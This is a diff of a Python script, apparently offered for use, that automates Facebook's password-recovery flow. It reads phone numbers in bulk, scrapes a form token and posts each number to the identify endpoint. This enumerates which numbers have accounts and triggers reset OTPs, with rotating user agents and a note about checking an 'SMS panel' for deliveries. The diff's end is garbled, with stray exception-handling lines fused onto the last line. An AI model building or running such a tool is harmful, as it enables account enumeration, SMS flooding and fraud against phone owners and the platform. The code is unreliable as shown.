@@ -1,40 +1,250 @@
 #!/usr/bin/env python3
 """
-🔥 FB OTP TRIGGER TOOL v4.0 - FINAL FIX
+Facebook Phone Number OTP Trigger Tool v5.0
+Pure requests-based. Works in Termux.
 Author: cybersecuritybhau-maker
-
-প্রথমবার চালানোর আগে:
-    pip install requests beautifulsoup4 colorama phonenumbers
-
-যেকোনো ফরম্যাটে নাম্বার দিন:
-    01712345678 (BD)
-    +8801712345678
-    8801712345678
-    12025551234 (USA)
-    447123456789 (UK)
-    
-কাজ:
-    Facebook forgot password endpoint এ requests পাঠিয়ে OTP ট্রিগার করে
-    Selenium লাগবে না, খুব ফাস্ট, detect হবে না
 """
 
-import sys, os, json, re, time, random, threading, queue
-from datetime import datetime
-from typing import List, Dict, Optional, Tuple
+import requests
+import re
+import time
+import sys
+import random
+import string
 
-# ==================== INSTALL CHECK ====================
+BANNER = """
+╔══════════════════════════════════════════╗
+║     FB Password Reset OTP Trigger v5.0   ║
+║     Pure Requests - No Selenium          ║
+╚══════════════════════════════════════════╝
+"""
 
-try:
-    import requests
-    from bs4 import BeautifulSoup
-    import colorama
-    from colorama import Fore, Back, Style
-    colorama.init()
+session = requests.Session()
+
+# Desktop Chrome User-Agent
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+]
+
+HEADERS_TEMPLATE = {
+    "User-Agent": random.choice(USER_AGENTS),
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Connection": "keep-alive",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "none",
+    "Sec-Fetch-User": "?1",
+    "Upgrade-Insecure-Requests": "1",
+    "Cache-Control": "max-age=0",
+}
+
+
+def extract_lsd_token(html_content):
+    """Extract lsd token from Facebook page HTML using multiple methods."""
+    # Method 1: JSON config pattern (current Facebook)
+    patterns = [
+        r'"token":"([a-zA-Z0-9_-]+)"',
+        r'name="lsd"[^>]*value="([^"]+)"',
+        r'"LSD",\[\],{"token":"([^"]+)"',
+        r'LSD\.push\(\{"token":"([^"]+)"',
+    ]
+    
+    for pattern in patterns:
+        match = re.search(pattern, html_content)
+        if match:
+            return match.group(1)
+    return None
+
+
+def extract_jsdatr(html_content):
+    """Extract _js_datr from Facebook page."""
+    patterns = [
+        r'"_js_datr","([a-zA-Z0-9_-]+)"',
+        r'_js_datr["\]]*[:=][\s"]]*([a-zA-Z0-9_-]+)',
+    ]
+    for pattern in patterns:
+        match = re.search(pattern, html_content)
+        if match:
+            return match.group(1)
+    return None
+
+
+def normalize_phone(phone):
+    """Accept any format - just strip whitespace and dashes."""
+    phone = phone.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
+    if not phone:
+        return None
+    return phone
+
+
+def check_and_trigger_otp(phone):
+    """Main function: extract token, send identify request, trigger OTP."""
+    phone = normalize_phone(phone)
+    if not phone:
+        return {"status": "error", "message": "invalid_phone"}
+    
+    headers = dict(HEADERS_TEMPLATE)
+    headers["User-Agent"] = random.choice(USER_AGENTS)
     
     try:
-        import phonenumbers
-        HAS_PHONE = True
-    except ImportError:
+        # STEP 1: Get the identify page and extract token
+        identify_url = "https://www.facebook.com/login/identify?ctx=recover&lwv=110"
+        resp = session.get(identify_url, headers=headers, timeout=15)
+        
+        lsd_token = extract_lsd_token(resp.text)
+        if not lsd_token:
+            return {"status": "error", "message": "TOKEN_ERROR - Could not extract lsd token", "phone": phone}
+        
+        # STEP 2: POST to identify.php endpoint
+        identify_headers = {
+            "User-Agent": headers["User-Agent"],
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://www.facebook.com",
+            "Referer": identify_url,
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-User": "?1",
+            "Upgrade-Insecure-Requests": "1",
+        }
+        
+        data = {
+            "lsd": lsd_token,
+            "email": phone,
+            "did_submit": "Search",
+            "__user": "0",
+            "__a": "1",
+            "__req": "3",
+            "__hs": "19768.HYP:comet_pkg.2.1.0.2.1",
+            "dpr": "1",
+            "__ccg": "EXCELLENT",
+            "__rev": "1017487563",
+            "__s": "4nchj8:7qcq3e:44hqhd",
+            "__comet_req": "1",
+        }
+        
+        resp2 = session.post(
+            "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover",
+            data=data,
+            headers=identify_headers,
+            timeout=15,
+        )
+        
+        # Check response
+        resp_text = resp2.text
+        
+        # If account not found
+        if "not found" in resp_text.lower() or "doesn't exist" in resp_text.lower():
+            return {"status": "not_found", "message": "Account not found", "phone": phone}
+        
+        # Try to extract ldata for redirect
+        ldata_match = re.search(r'ldata=([a-zA-Z0-9-_]+)', resp_text)
+        if ldata_match:
+            ldata = ldata_match.group(1)
+            
+            # STEP 3: Go to recover/initiate page
+            recover_url = f"https://www.facebook.com/recover/initiate?ldata={ldata}"
+            resp3 = session.get(recover_url, headers=headers, timeout=15)
+            
+            # Check if we see recovery options - this means account exists
+            if "recover" in resp3.text.lower() or "code" in resp3.text.lower() or "send" in resp3.text.lower():
+                return {"status": "found", "message": "OTP trigger initiated - Account found, recovery page loaded", "phone": phone}
+            else:
+                return {"status": "found", "message": "Account found (ldata received)", "phone": phone}
+        
+        # If no ldata but no error - account might exist
+        if "find your account" in resp_text.lower():
+            return {"status": "not_found", "message": "Account not found", "phone": phone}
+        
+        return {"status": "found", "message": "Account may exist", "phone": phone}
+        
+    except requests.exceptions.Timeout:
+        return {"status": "error", "message": "timeout", "phone": phone}
+    except Exception as e:
+        return {"status": "error", "message": str(e), "phone": phone}
+
+
+def main():
+    print(BANNER)
+    
+    # Accept phone numbers from command line or file
+    phones = []
+    
+    if len(sys.argv) > 1:
+        # Check if file or direct input
+        if sys.argv[1] == "-f" and len(sys.argv) > 2:
+            try:
+                with open(sys.argv[2], "r") as f:
+                    phones = [line.strip() for line in f if line.strip()]
+                print(f"[+] Loaded {len(phones)} numbers from {sys.argv[2]}")
+            except FileNotFoundError:
+                print(f"[-] File not found: {sys.argv[2]}")
+                return
+        else:
+            phones = [sys.argv[1]]
+    else:
+        # Interactive mode
+        print("[?] Enter phone number(s) (comma separated or one per line, empty line to finish):")
+        while True:
+            line = input("> ").strip()
+            if not line:
+                break
+            for p in line.split(","):
+                p = p.strip()
+                if p:
+                    phones.append(p)
+    
+    if not phones:
+        print("[-] No phone numbers provided.")
+        return
+    
+    print(f"\n[+] Total numbers to check: {len(phones)}")
+    print("[+] Starting OTP trigger...\n")
+    
+    results = {"found": 0, "not_found": 0, "error": 0}
+    start_time = time.time()
+    
+    for i, phone in enumerate(phones, 1):
+        print(f"[{i}/{len(phones)}] Checking: {phone}", end=" ", flush=True)
+        
+        result = check_and_trigger_otp(phone)
+        
+        elapsed = time.time() - start_time
+        
+        if result["status"] == "found":
+            results["found"] += 1
+            print(f"✓ FOUND - OTP triggered!")
+        elif result["status"] == "not_found":
+            results["not_found"] += 1
+            print(f"✗ Not found")
+        else:
+            results["error"] += 1
+            print(f"✗ Error: {result['message']}")
+        
+        # Rate limit: 2-3 second delay
+        if i < len(phones):
+            time.sleep(random.uniform(2.0, 3.5))
+    
+    total_time = time.time() - start_time
+    speed = len(phones) / total_time if total_time > 0 else 0
+    
+    print(f"\n{'='*50}")
+    print(f"Results: {results['found']} found, {results['not_found']} not found, {results['error']} errors")
+    print(f"Time: {total_time:.1f}s | Speed: {speed:.1f}/s")
+    
+    # Print found numbers
+    print(f"\n[+] Numbers that triggered OTP:")
+    print(f"    (Check your SMS panel for OTP deliveries)")
+
+
+if __name__ == "__main__":
+    main()    except ImportError:
         HAS_PHONE = False
     
 except ImportError as e:
